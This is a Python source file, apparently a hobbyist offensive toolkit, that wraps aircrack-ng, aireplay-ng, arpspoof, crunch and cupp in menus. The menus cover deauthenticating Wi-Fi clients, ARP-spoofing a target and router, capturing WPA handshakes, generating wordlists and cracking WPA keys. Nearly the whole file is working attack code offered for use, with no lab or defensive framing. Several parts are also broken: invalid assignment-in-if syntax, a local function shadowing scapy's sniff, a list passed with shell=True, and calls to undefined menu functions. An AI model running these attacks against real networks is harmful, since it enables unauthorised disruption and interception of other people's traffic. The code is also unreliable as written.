import subprocess
from scapy.all import *
import argparse
import time
def crackWifi(cap_file, wordlist): # crack Wifi password for WPA/WPA2 networks
    command = [
        'sudo','aircrack-ng',cap_file,'-w',wordlist
    ]

    try:
        
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        
        print(f"Error: {e}")
#-------Wordlist--------
def crunch(min_chars, max_chars, characters, pattern, filename): # use crunch tool
    command = [
        'sudo', 'crunch', str(min_chars), str(max_chars), characters,
        '-t', pattern, '-i', filename
    ]

  
    try:
        result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(result.stdout.decode())
    except subprocess.CalledProcessError as e:
        print("Error occurred:",e.stderr.decode())




def cupp(): # use cupp tool
    try:
        subprocess.run(['sudo', 'cupp', '-i'])
    except FileNotFoundError:
        print("Error: The 'cupp' tool is not installed or not found in the system's PATH.")
    except Exception as e:
        print(f"An error occurred: {e}")
#-----------------------        
def wordlist():
    while True:
        print('''
    1. Create a wordlist using Cupp (beginner friendly)
    2. Create a wordlist using Crunch
    BACK. Back to main menu
    
''')
        wordlistChoice=input('Select an option: ')
        if wordlistChoice=='1':
            cupp()
        elif wordlistChoice=='2':
            min_chars=input('Enter the minimum characters for the words generated: ')
            max_chars=input('Enter the maximum characters for the words generated: ')
            characters=input('Enter the characters that you would like to use (e.g. ABCD123 to include only A,B,C,D,1,2,3): ')
            pattern=input("Enter the pattern that you would like the words to have (e.g. a@@@b to generate words that starts with 'a' and ends with 'b' and contains a total of 5 characters): ")
            wordlist_file=input('Enter the name of the file you would like to save the wordlist to: ')
            crunch(min_chars,max_chars,characters,pattern,wordlist_file)
        elif wordlistChoice=='BACK':
            main()
        else:
            print('Invalid option')
            
            
            
#------Wireless Attacks-----------
def captureHandshake(bssid, channel, filename, interface): # capture a four-way handshake
    
    
    command = [
        "sudo",
        "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        "--write", filename,
        interface
    ]

    
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("Error running airodump-ng: ",e)

    
def arpSpoof(interface,target_ip,router_ip): # ARP spoofing


    subprocess.run(["sudo", "netdiscover", "-i", interface])


    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")


    subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, router_ip])
    subprocess.Popen(["arpspoof", "-i", interface, "-t", router_ip, target_ip])

def viewTraffic(interface):
    subprocess.Popen(["wireshark", "-i", interface])
def deauthenticate(deauth_packets, bssid, client_mac, interface): #deauth attack
    try:
        
        command = [
            'sudo',
            'aireplay-ng',
            '--deauth', str(deauth_packets),
            '-a', bssid,
            '-c', client_mac,
            interface
        ]

        
        subprocess.run(command, check=True)
        print("Deauthentication packets sent successfully.")
    except subprocess.CalledProcessError as e:
        print("An error occurred while sending deauth packets:",e)
    except Exception as e:
        print("An unexpected error occurred:",e)
def capture_packets(bssid, channel, interface, filename): # targeted packet capture
    
    
    subprocess.run(['iwconfig', interface, 'channel', str(channel)])
    
    
    print("Capturing packets on",interface,"for BSSID",bssid)
    packets = sniff(
        iface=interface, 
        bpf_filter=f'ether host {bssid}',  
        prn=lambda x: x.summary(),  
        count=0,  
        store=1   
    )
    
    
    wrpcap(filename, packets)
def get_monitor_mode_interface(): # get the name of the interface in monitor mode
    try:
        
        iwconfig_output = subprocess.check_output(['iwconfig'], stderr=subprocess.DEVNULL).decode('utf-8')
        
      
        for line in iwconfig_output.split('\n'):
            
            if " Mode:Monitor" in line:
                
                return line.split()[0]
        
        
        return None
        
    except (subprocess.CalledProcessError, FileNotFoundError):
        
        return None
def sniff(interface): # start sniffing on all frequencies
    try:
        
        command = ['sudo','airodump-ng', interface, '-abg']
        
        
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("An error occurred while running airodump-ng: ",e)
    except FileNotFoundError:
        print("airodump-ng is not installed or not found in the system path.")
    except Exception as e:
        print("An unexpected error occurred: ",e)
        
def monitor_mode(interface):
    try:
        
        subprocess.run(['sudo','airmon-ng', 'start', interface], check=True)
        print("Successfully started monitor mode on",interface,'\n')
    except subprocess.CalledProcessError as e:
        print("Failed to start monitor mode on ",interface,': ',e)
def wirelessAttack(): # selection of options for wireless attacks
    while True:
        print('''
    1. Put a wireless card in monitor mode
    2. Packet sniffing
    3. Targeted packet sniffing
    4. Deauth attack
    5. ARP spoofing attack
    6. View captured traffic
    7. Capture WPA/WPA2 handshake
    8. Crack WPA/WPA2 with wordlist
    BACK. Back to main menu

    Note: Support for WEP cracking and WPS pin cracking will be added in the future. 
    ''')
        WAchoice=input('Select an option: ')
        if WAchoice=='1':
            check_command = ["airmon-ng", "check"]
    
            try:
                
                check_output = subprocess.run(check_command, capture_output=True, text=True, check=True)
                print("Processes that may interfere with airmon-ng:")
                print(check_output.stdout)
        
                
                kill_command = ["airmon-ng", "check", "kill"]
                kill_output = subprocess.run(kill_command, capture_output=True, text=True, check=True)
        
            
                print(kill_output.stdout)
        
            except subprocess.CalledProcessError as e:
                print("An error occurred while executing the command:")
                print(e.stderr)
            monInterface=input('Enter your interface name: ')
            monitor_mode(monInterface)
            monMode=get_monitor_mode_interface()
            print('The new interface name is:',monMode)
        elif WAchoice=='2':
            monMode = get_monitor_mode_interface() # interface name
            sniff(monMode)
        elif WAchoice=='3':
            monMode = get_monitor_mode_interface()
            bssid=input('Enter the BSSID of the network: ')
            channel=input('Enter the channel: ')
            interface=monMode
            filename=input('Enter the name of the file to write results to: ')
            capture_packets(bssid,channel,interface,filename)
        elif WAchoice=='4':
            monMode = get_monitor_mode_interface()
            deauth_packets=input('How many deauth packets would you like to send? ')
            bssid=input('Enter the BSSID of the network: ')
            clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
            interface=monMode
            deauthenticate(deauth_packets,bssid,clientMac,interface)
        elif WAchoice=='5':
            monMode = get_monitor_mode_interface()
            target_ip=input('Enter the target ip: ')
            router_ip=input('Enter the router ip: ')
            arpSpoof(monMode,target_ip,router_ip)
        elif WAchoice=='6':
            monMode = get_monitor_mode_interface()
            changeInterface=input('The default interface is',monMode,', would you like to change it? [y/n]: ')
            if changeInterface='y':
                newInterface=input('Enter the name of the interface whose captured traffic you would like to view: ')
                viewTraffic(newInterface)
            elif changeInterface='n':
                viewTraffic(monMode)
            else:
                print(invalid option)
        elif WAchoice=='7':
            monMode = get_monitor_mode_interface()
            ifDeauth=input('Would you like to deauthenticate a client to speed up the process [y/n]: ')
            if ifDeauth=='y':
                deauth_packets=input('How many deauth packets would you like to send? ')
                bssid=input('Enter the BSSID of the network: ')
                channel=input('Enter the channel # of the network: ')
                filename2=input('Enter the file name to save the captured results to: ')
                clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
                interface=monMode
                deauthenticate(deauth_packets,bssid,clientMac,interface)
                captureHandshake(bssid,channel,filename2,interface)
            elif ifDeauth=='n':
                bssid=input('Enter the BSSID of the network: ')
                channel=input('Enter the channel # of the network: ')
                filename2=input('Enter the file name to save the captured results to: ')
                interface=monMode
                captureHandshake(bssid,channel,filename2,interface)
        elif WAchoice=='8':
            monMode = get_monitor_mode_interface()
            print('Generate a wordlist first with option 6 on the main menu\n')
            createWordlist=input('Did you create the wordlist to use [y/n]? ')
            if createWordlist=='y':
                cap_file=input('Enter the name of the .cap file with the four-way handshake: ')
                wordlistName=input('Enter the name of the wordlist: ')
                crackWifi(cap_file,wordlistName)
            elif createWordlist=='n':
                print('Taking you to the wordlist generator. Come back when you are done.')
                time.sleep(2)
                wordlist()
            else:
                print('Invalid option')
            
                
            
  
#-------------Main--------------------
print('''

#######################################
#        Author & Maintainer:         #
#                                     #
#            Shu-Hao Liu              #
#                                     #
#######################################

Tip: Switch to root before running this tool to get a smoother experience

''')

def main():
    print('''

    1. Wireless Attacks
    2. Scanning and Reconnaissance
    3. Social Engineering Attacks
    4. Payload Generator
    5. Password Attacks
    6. Create a wordlist
    ''')

    choice1= input('Select an option: ')

    if choice1=='1':
        wirelessAttack()
    elif choice1=='2':
        recon()
    elif choice1=='3':
        socialEngineering()
    elif choice1=='4':
        payload()
    elif choice1=='5':
        passwdAttacks()
    elif choice1=='6':
        wordlist()
    else:
        print('Invalid option')
#-----------------------------------
main()
